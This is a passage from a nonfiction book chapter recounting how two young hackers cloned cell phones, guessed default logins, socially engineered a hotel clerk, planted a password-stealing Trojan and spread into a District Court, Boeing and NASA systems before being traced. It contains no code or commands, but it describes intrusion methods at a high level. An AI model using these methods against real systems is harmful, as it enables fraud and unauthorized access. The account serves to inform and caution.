always kept those close at hand. I really didn’t start taking off
with the hacking until I had a computer that could handle it and
that was the Commodore 128.
Costa met Matt — Charles Matthew Anderson — on a BBS (bulletin
board system) in the Washington state area. “We were friends for I think
probably a year via telephone and messaging on these bulletin boards
before we actually even met.” Matt — whose handle is “Cerebrum” —
describes his childhood as “pretty normal.” His father was an engineer at
Boeing and had a computer at home that Matt was allowed to use. It’s
easy to imagine the father so uncomfortable with the boy’s preferences in
music (“industrial and some of the darker stuff”) that he overlooked what
the dangerous path Matt was following on the computer.
I started learning how to program basic when I was about nine
years old. I spent most of my teenage years getting into graphics
and music on the computer. That’s one of the reasons I still like com-
puters today — the hacking on that multimedia stuff is really fun.
I first got into the hacking stuff in my senior year in high school,
getting into the phreaking side of it, learning how to take advan-
tage of the telephone network that was used by the teachers and
administrators to make long distance calls. I was heavily into
that in my high school years.
Matt finished high school among the top 10 in his class, entered the
University of Washington, and began learning about legacy computing:
mainframe computing. At college, with a legitimate account on a Unix
machine, he started teaching himself about Unix for the first time, “with
some help from the underground bulletin-board and web sites.”
Phreaking
After they became a team, it seemed as if Matt and Costa were leading
each other in the wrong direction, down the road of hacking into the
telephone system, an activity known as “phreaking.” One night, Costa
remembers, the two went on an expedition that hackers call “dumpsterThe Art of Intrusion 7008_569597 ch04.qxd  1/11/05  9:22 PM  Page 70

diving,” scouring through the trash left outside the relay towers of the cell
phone companies. “In the garbage amongst coffee grounds and other
stinky stuff, we got a list of every tower and each phone number” — the
phone number and electronic serial number, or ESN, that is a unique
identifier assigned to each cell phone. Like a pair of twins remembering a
shared event from childhood, Matt chimes in: “These were test numbers
that the technicians would use to test signal strengths. They would have
special mobile phones that would be unique to that tower.” 
The boys bought OKI 900 cells phones and a device to burn new pro-
gramming onto the computer chips in the phones. They did more than
just program new numbers; while they were at it, they also installed a spe-
cial firmware upgrade that allowed them to program any desired phone
number and ESN number into each of the phones. By programming the
phones to the special test numbers they had found, the two were provid-
ing themselves free cell phone service. “The user chooses which number
he wants to use for placing a call. If we had to we could switch through
to another number real quick,” Costa said.
(This is what I call “the Kevin Mitnick cellular phone plan” — zero a
month, zero a minute, but you may end up paying a heavy price at the
end, if you know what I mean.)
With this reprogramming, Matt and Costa could make all the cell
phone calls they wanted, anywhere in the world; if the calls were logged
at all, they would have gone on the books as official business of the cell
company. No charges, no questions. Just the way any phone phreaker or
hacker likes it.
Getting into Court
Landing in court is about the last thing any hacker wants to do, as I know
only too well. Costa and Matt got into court early in their hacking
together, but in a different sense.
Besides dumpster diving and phone phreaking, the two friends would
often set their computers war dialing, looking for dial-up modems that
might be connected to computer systems they could break into. They could
between them check out as many as 1,200 phone numbers in a night. With
their machines dialing non-stop, they could run through an entire telephone
prefix in two or three days. When they returned to their machines, the com-
puter logs would show what phone numbers they had gotten responses
from. “I was running my wardialer to scan a prefix up in Seattle, 206-553,”
Matt said. “All those phone numbers belong to federal agencies of some sort
or another. So just that telephone prefix was a hot target because that’s
where you would find the federal government computers.” In fact, they had
no particular reason for checking out government agencies.Chapter 4 Cops and Robbers
 7108_569597 ch04.qxd  1/11/05  9:22 PM  Page 71

Costa: We were kids. We had no master plan.
Matt: What you do is you just kinda throw the net out in the sea
and see what kind of fish you come back with. 
Costa: It was more of a “What can we do tonight?” type thing,
“What can we scan out tonight?”
Costa looked at his war dialer log one day and saw that the program
had dialed into a computer that returned a banner reading something like
“U.S. District Courthouse.” It also said, “This is federal property,” He
thought, “This looks juicy.”
But how to get into the system? They still needed a username and pass-
word. “I think it was Matt that guessed it,” Costa says. The answer was
too easy: Username: “public.” Password: “public.” So there was “this
really strong, scary banner” about the site being federal property, yet no
real security barring the door.
“Once we were into their system, we got the password file,” Matt says.
They easily obtained the judges’ sign-on names and passwords. “Judges
would actually review docket information on that court system and they
could look at jury information or look at case histories.” 
Sensing the risk, Matt says, “We didn’t explore too far into the court.”
At least, not for the moment.
Guests of the Hotel
Meanwhile, the guys were busy in other areas. “One of the things we also
compromised was a credit union. Matt discovered a pattern in the num-
bers for their codes that made it easy for us to make telephone calls” at
the association’s expense. They also had plans to get into the computer
system of the Department of Motor Vehicles “and see what kind of dri-
ver’s licenses and stuff we could do.” 
They continued to hone their skills and break into computers. “We
were on a lot of computers around town. We were on car dealerships.
Oh, and there was one hotel in the Seattle area. I had called them and
acted like I was a software technician for the company that made the
hotel reservation software. I talked to one of the ladies at the front desk
and explained that we were having some technical difficulties, and she
wouldn’t be able to do her job correctly unless she went ahead and made
a few changes.”
With this standard, familiar social engineering gambit, Matt easily
found out the logon information for the system. “The username and
password were ‘hotel’ and ‘learn.’” Those were the software developers’
default settings, never changed. The Art of Intrusion 7208_569597 ch04.qxd  1/11/05  9:22 PM  Page 72

The break-in to the computers of the first hotel provided them a learn-
ing curve on a hotel reservations software package that turned out to be
fairly widely used. When the boys targeted another hotel some months
later, they discovered that this one, too, might be using the software they
were already familiar with. And they figured this hotel might be using the
same default settings. They were right on both counts. According to Costa:
We logged into the hotel computer. I had a screen basically just
like they would have right there in the hotel. So I logged in and
booked a suite, one of the top $300 a night suites with a water
view and the wet bar and everything. 
I used a fake name, and put a note that a $500 cash deposit had
been made on the room. Reserved for a night of hell-raising. We
basically stayed there for the whole weekend, partied, and emptied
out the mini bar.
Their access to the hotel’s computer system also gave them access to
information on guests who had stayed at the hotel, “including their
financial information.”
Before checking out of the hotel, the boys stopped by the front desk
and tried to get change from their “cash deposit.” When the clerk said
the hotel would send a check, they gave him a phony address and left.
“We were never convicted of that,” Costa says, adding, “Hopefully the
statute of limitations is up.” Any regrets? Hardly. “That one had a little
bit of a payoff in that wet bar.”
Opening a Door
After that wild weekend, the emboldened boys went back to their com-
puters to see what else they could do with the hack into the District
Court. They quickly found out that the operating system for the court
computer had been purchased from a company we’ll call Subsequent.
The software had a built-in feature that would trigger a phone call to
Subsequent anytime software patches were needed — for example, “If a
customer of a Subsequent computer bought a firewall and the operating
system needed patches for the firewall to run, the company had a method
for logging in to their corporate computer system to get the patches.
That’s basically how it was back then,” Costa explained.
Matt had a friend, another C programmer, who had the skills to write
a Trojan — a piece of software that provides a secret way for a hacker to
get back onto a computer he has made his way into earlier. This was very
handy if passwords are changed or other steps are taken to block access.
Through the computer at the District Court, Matt sent the Trojan to theChapter 4 Cops and Robbers
 7308_569597 ch04.qxd  1/11/05  9:22 PM  Page 73

Subsequent corporate computer. The software was designed so that it
would also “capture all the passwords and write them to a secret file, as
well as allow us a root [administrator access] bypass in case we ever got
locked out.”
Getting into the Subsequent computer brought them an unexpected
bonus: access to a list of other companies running the Subsequent oper-
ating system. Pure gold. “It told us what other machines we could
access.” One of the companies named on the list was a giant local firm,
the place where Matt’s father worked: Boeing Aircraft.
“We got one of the Subsequent engineer’s username and password,
and they worked on the boxes that he had sold Boeing. We found we had
access to login names and passwords to all the Boeing boxes,” Costa said.
The first time Matt called the phone number for external connections
to the Boeing system, he hit a lucky break. 
The last person that called in hadn’t hung up the modem properly
so that when I dialed in I actually had a session under some user.
I had some guy’s Unix shell and it’s like, “Wow, I’m suddenly into
the guy’s footprint.” 
(Some early dial-up modems were not configured so they would auto-
matically log off the system when a caller hung up. As a youngster, when-
ever I would stumble across these types of modem configurations, I
would cause the user’s connection to be dropped by either sending a
command to a telephone company switch, or by social engineering a
frame technician to pull the connection. Once the connection was bro-
ken, I could dial in and have access to the account that was logged in at
the time of the dropped connection. Matt and Costa, on the other hand,
had simply stumbled into a connection that was still live.)
Having a user’s Unix shell meant that they were inside the firewall, with
the computer in effect standing by, waiting for him to give instructions.
Matt recalls:
So immediately I went ahead and cracked his password and then
I used that on some local machines where I was able to get root
[system administrator] access. Once I had root, we could use some
of the other accounts, try going onto some of the other machines
those people accessed by looking at their shell history.
If it was a coincidence that the modem just happened to online when
Matt called, what was going on at Boeing when Matt and Costa started
their break-in to the company was an even greater coincidence. The Art of Intrusion 7408_569597 ch04.qxd  1/11/05  9:22 PM  Page 74

Guarding the Barricades
At that moment, Boeing Aircraft was hosting a high-level computer secu-
rity seminar for an audience that included people from corporations, law
enforcement, FBI, and the Secret Service. 
Overseeing the session was Don Boelling, a man intimate with Boeing’s
computer security measures and the efforts to improve them. Don had
been fighting the security battles internally for a number of years. “Our
network and computing security was like everywhere else, it was basically
zip. And I was really concerned about that.” 
As early as 1988, when he was with the newly formed Boeing
Electronics, Don had walked into a meeting with the division president
and several vice presidents and told them, “Watch what I can do with
your network.” He hacked modem lines and showed that there were no
passwords on them, and went on to show he could attack whatever
machines he wanted. The executives saw one computer after another that
had a guest account with a password of “guest.” And he showed how an
account like that makes it easy to access the password file and download
it to any other machine, even one outside the company.
He had made his point. “That started the computing security program at
Boeing,” Don told us. But the effort was still in its infancy when Matt and
Costa began their break-ins. He had been having “a hard time convincing
management to really put resources and funding into computing security.”
The Matt and Costa episode would prove to be “the one that did it for me.”
His courageous role as a spokesman for security had led to Don organ-
izing the groundbreaking computer forensics class at Boeing. “A gov-
ernment agent asked us if we wanted to help start a group of law
enforcement and industry people to generate information. The organiza-
tion was designed to help train law enforcement in computer technology
forensics, involving high-tech investigations techniques. So I was one of
the key players that helped put this together. We had representatives from
Microsoft, US West, the phone company, a couple of banks, several dif-
ferent financial organizations. Secret Service agents came to share their
knowledge of the high-tech aspects of counterfeiting.” 
Don was able to get Boeing to sponsor the sessions, which were held
in one of the company’s computer training centers. “We brought in
about thirty-five law enforcement officers to each week-long class on how
to seize a computer, how to write the search warrant, how to do the
forensics on the computer, the whole works. And we brought in Howard
Schmidt, who later was recruited onto the Homeland Security force,
answering to the President for cyber-crime stuff.”
On the second day of the class, Don’s pager went off. “I called back
the administrator, Phyllis, and she said, ‘There’s some strange thingsChapter 4 Cops and Robbers
 7508_569597 ch04.qxd  1/11/05  9:22 PM  Page 75

going on in this machine and I can’t quite figure it out.” A number of
hidden directories had what looked like password files in them, she
explained. And a program called Crack was running in the background.
That was bad news. Crack is a program designed to break the encryp-
tion of passwords. It tries a word list or a dictionary list, as well as per-
mutations of words like Bill1, Bill2, Bill3 to try to discern the password. 
Don sent his partner, Ken (“our Unix security guru”) to take a look.
About an hour later, Ken paged Don and told him, “You better get up
here. This looks like it might be pretty bad. We’ve got numerous pass-
words cracked and they don’t belong to Boeing. There’s one in particu-
lar you really need to look at.”
Meanwhile, Matt had been hard at work inside the Boeing computer
networks. Once he had obtained access with system administrator privi-
leges, “it was easy to access other accounts by looking into some of the
other machines those people had accessed.” These files often had tele-
phone numbers to software vendors and other computers the machine
would call. “A primitive directory of other hosts that were out there,”
says Matt. Soon the two hackers were accessing the databases of a variety
of businesses. “We had our fingers in a lot of places,” Costa says.
Not wanting to leave the seminar, Don asked Ken to fax down what he
was seeing on the administrator’s screen. When the transmission arrived,
Don was relieved not to recognize any of the user IDs. However, he was
puzzled over the fact that many of them began with “Judge.” Then it
hit him:
I’m thinking, “Oh my God!” I walked into this classroom full of
law enforcement officers and said, “Do you guys recognize any of
these names?” I read off a list of the names. One federal officer
explained, “Those are judges in the U.S. District Court in
Seattle.” And I said, “Well, I have a password file here with 26
passwords cracked.” Those federal officers about turned green. 
Don watched as an FBI agent he’d worked with in the past made a few
phone calls.
He calls up the U.S. District Court and gets hold of the system
administrator. I can actually hear this guy on the other end of the
line going, “No, no way. We’re not connected to the Internet.
They can’t get our password files. I don’t believe it’s our
machine.” And Rich is saying, “No, it is your machine. We’ve got
the password files.” And this guy is going, “No, it can’t happen.
People can’t get into our machines.” The Art of Intrusion 7608_569597 ch04.qxd  1/11/05  9:22 PM  Page 76

Don looked down at the list in his hand and saw that the root pass-
word — the top-level password known only to system administrators —
had been cracked. He pointed it out to Rich.
Rich says into the telephone, “Is your root password ‘2ovens’?”
Dead silence on the other end of the line. All we heard was a
“thunk” where this guy’s head hit the table.
As he returned to the classroom, Don sensed a storm brewing. “I said,
‘Well, guys, it’s time for some on-the-job real life training.’”
With part of the class tagging along, Don prepared for battle. First, he
went to the computer center in Bellevue where the firewall was located.
“We found the account that was actually running the Crack program, the
one the attacker was logging in and out of, and the IP address he was
coming from.”
By this time, with their password-cracking program running on the
Boeing computer, the two hackers had moved into the rest of Boeing’s
system, “spider-webbing” out to access hundreds of Boeing computers. 
One of the computers that the Boeing system connected to wasn’t even
in Seattle. In fact, it was on the opposite coast. According to Costa:
It was one of the Jet Propulsion lab computers at NASA’s Langley
Research Labs in Virginia, a Cray YMP5, one of the crown jew-
els. That was one of our defining moments.
All kinds of things cross your mind. Some of the secrets could make
me rich, or dead, or really guilty. 
The folks in the seminar were taking turns watching the fun in the
computer center. They were stunned when the Boeing security team dis-
covered their attackers had gotten access to the Cray, and Don could
hardly believe it. “We were able to very quickly, within an hour or two,
determine that access point and the access points to the firewall.”
Meanwhile, Ken set up virtual traps on the firewall in order to determine
what other accounts the attackers had breached.
Don rang the local phone company and asked to have a “trap and
trace” put on the Boeing modem lines that the attackers were using. This
is a method that would capture the phone number that the calls were
originating from. The telephone people agreed without hesitation.
“They were part of our team and knew who I was, no questions asked.
That’s one of the advantages of being on these law enforcement teams.”
Don put laptops in the circuits between the modems and the comput-
ers, “basically to store all the keystrokes to a file.” He even connectedChapter 4 Cops and Robbers
 7708_569597 ch04.qxd  1/11/05  9:22 PM  Page 77

Okidata printers to each machine “to print everything they did in real
time. I needed it for evidence. You can’t argue with paper like you can
with an electronic file.” Maybe it’s not surprising when you think about
which a panel of jurors is more likely to believe: an electronic file or a
document printed out at the very time of the incident.
The group returned to the seminar for a few hours where Don outlined
the situation and defensive measures taken. The law enforcement officers
were getting hands-on, graduate-level experience in computer forensics.
“We went back up to do some more work and check on what we had,
and while I was standing there with two federal officers and my partner,
the modem goes off. Bingo, these guys came in, logged in on the
account,” Don said.
The local phone company tracked Matt and Costa to their homes. The
team watched as the hackers logged into the firewall. They then trans-
ferred over to the University of Washington, where they logged in to
Matt Anderson’s account. 
Matt and Costa had taken precautions that they thought would protect
their calls from being traced. For one thing, instead of dialing Boeing
directly, they were calling into the District Court computers and then
routing a call from the Court to Boeing. They figured that “if there was
someone monitoring us at Boeing, they were probably having a rough
time figuring out where our call was originating from,” Costa said.
They had no idea their every move was being watched and recorded as
Matt dialed into the Court, from there to Boeing, and then transferred
to his personal student account. 
Since we were so new on [the District Court] system and the pass-
word and user name were “public,” at the time I didn’t think it
was a threat, or I was being lazy. That direct dial is what gave
them the trace to my apartment and that’s where everything 
fell apart.
Don’s team felt like the proverbial fly on the wall as Matt started read-
ing the email on his student account. “In this guy’s email is all this stuff
about their hacker exploits and responses from other hackers.”
The law enforcement officers are sitting there laughing their asses
off, ’cause these are basically arrogant kids, not considering
they’d get caught. And we’re watching them real time produce
evidence right there in our hands.
Meanwhile, Don was ripping the sheets off the printer, having every-
body sign as a witness, and sealing then as evidence. “In less than sixThe Art of Intrusion 7808_569597 ch04.qxd  1/11/05  9:22 PM  Page 78

hours from the point we knew we had this intrusion, we already had these
guys on criminal trespass.”
Boeing management was not laughing. “They were scared out of their
wits and wanted the hackers terminated — ‘Get them off the computers
and shut all this off right now .’” Don was able to convince them it would
be wiser to wait. “I said, ‘We don’t know how many places these guys
have gotten into. We need to monitor them for a while and find out what
the heck is going on and what they’ve done.’” When you consider the
risk involved, it was a remarkable testament to Don’s professional skills
that management capitulated.
Under Surveillance
One of the federal officers attending the seminar obtained warrants for tap-
ping Matt and Costa’s telephones. But the wiretaps were only one part of
the effort. By this time the federal government was taking the case very
seriously. The action had assumed aspects of a spy movie or a crime thriller:
FBI agents were sent to the campus in teams. Posing as students, they fol-
lowed Matt around campus, noting his actions so they would later be able
to testify that at some particular time, he was using one particular computer
on campus. Otherwise it would be easy to claim, “That wasn’t me — lots
of people use that computer every day.” It had happened before.
On the Boeing side, the security team took every precaution they could
think of. The goal wasn’t to keep the boys out but to watch closely, con-
tinuing to gather evidence while making sure they didn’t do any damage.
Don explains, “We had all of our computers’ main entry points set up to
where either the system administrator or the computer would page us
and let us know some activity was going on.” The pager’s beep became
a cry to “battle stations.” Team members immediately notified select
individuals on a call list to let them know the hackers were on the prowl
again. Several times, Don’s group electronically tracked Matt and Costa’s
activity through the University of Washington — where key staff had
been briefed — all the way through the Internet, from point to point. It
was like being beside the two as they made the actual break in.
Don decided to watch them for another four or five days because “basi-
cally we had them fairly well contained and they weren’t doing anything
that I would consider extremely dangerous, though they had consider-
able access and could have if they wanted to.”
But Costa soon learned something was up:
One night my girlfriend and I were sitting in my apartment
watching TV. It was a summer night, and the window was open,
and it’s funny but she looked outside ... and noticed a car in theChapter 4 Cops and Robbers
